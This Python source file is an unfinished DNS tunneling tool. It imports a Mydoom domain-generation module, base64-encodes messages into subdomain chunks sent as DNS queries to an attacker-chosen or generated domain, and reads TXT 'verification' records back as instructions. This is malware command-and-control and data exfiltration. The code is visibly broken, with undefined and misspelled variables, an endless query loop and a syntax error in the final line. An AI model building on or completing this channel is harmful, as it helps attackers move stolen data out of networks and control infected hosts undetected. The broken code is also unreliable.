#!/usr/bin/env python3

import argparse
import base64
from sys import argv

import dns.resolver
from dga import mydoom

# communication.py
# <Fucntions>
##  - can check the number of the response packet
##  - can select both and Specific domain DGA domain
##  - can select the type of decode
##  - can define the interval
##  - can embed the message or predifine characters as beacon frame into subdomain
# <Scenario>
## 1. decide the target hostname
##   - dga or specific domain
## 2. check the size of message in teh TXT record
## 3. request the TXT record
# <Mapping of subdomain>
## - 'mail' : the size of RR
## - 'www'  : the required packet numbers

def search_response(msg:str)->str:
    pass

def exfiltrate(msg: str, length: int=10) -> list:
    """
    - control the number of packets based of the response packet size
    - if the requested message packet, 
    """
    # if you decode the message, put on '=' in the end after comine the line
    encrypted = base64.b64encode(msg.encode()).decode().strip('=')
    decomposed_msg = [_encrypted[i: i+lentgh] for i in range(0, len(_encrypted), length)]
    return decompose_msg

def query(message: list, hostname: str, RR: str) -> list:
    """
    - deal with the number of requesting messages
    - send the query message to the auth server
    - handle RR based on the query message
    """
    # Query the DNS request to the auth server
    if len(message) == 1:
        payload = [message + '.' + hostname]
        if message == 'mail' or 'www':
            RR = 'A'
            while True:
                dns.resolver.query(payload, RR)
            return 0

        else:
            RR = 'TXT'
            response = dns.resolver.query(payload, RR)
            verification_line = [str(i).split('=') for i in response[:]\
                                if 'verification' in str(i)]
            return verification_line

    else:
        payload = [msg + '.' + hostname for msg in message]
        RR = 'A'
        for i in payload:
            dns.resolver.query(payload, RR)
        return 0


def decipher(answer: list) -> str:

    """
    - Gather the TXT query's domain authentication value
    - Extract the value of domain verification
    - Decode the strings when the string is decode by base64
    """

    subdomain = [str(i).split('=')[1] for i in answer]
    subdomain = [i.strip(DOMAIN) for i in answer]
    value = [base64.b64decode(i.decode()) for i in _subdomain]

    pass

def main(qname: str) -> str:
    answer = request(query)
    print(answer)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                    usage='communicate.py [-h] [-s(specify) <hostname>|-d(DGA)]'\
                          '[-t(decode_type) <base*>] [-i(interval {s}) <60>]',\
                    description='Get the value of domain verification')
    parser.add_argument('-s', '--specify', help='specify the target host', \
                        action='store_true')
    parser.add_argument('-d', '--dga', help='use domain genelation algrorithm', \
                        action='store_true')
    parser.add_argument('-t', '--decode_type', help='difine the type of decode', \
                        action='store_true')
    parser.add_argument('-i', '--interval', help='difine the interval time of \
                        request packet', action='store_true')
    parser.add_argument('-c', '--', help='define the messages into subdomain',\
                        action='store_true')


    args = parser.parse_args()
    if args.specify:
        domain = args.domain
        # call function
    if args.dga:
        # call DGA function
        pass
    if args.decode_type:
        decode = args.decode_type
    if args.interval:
        interval = args.interval
    if args.message:
         = args.message
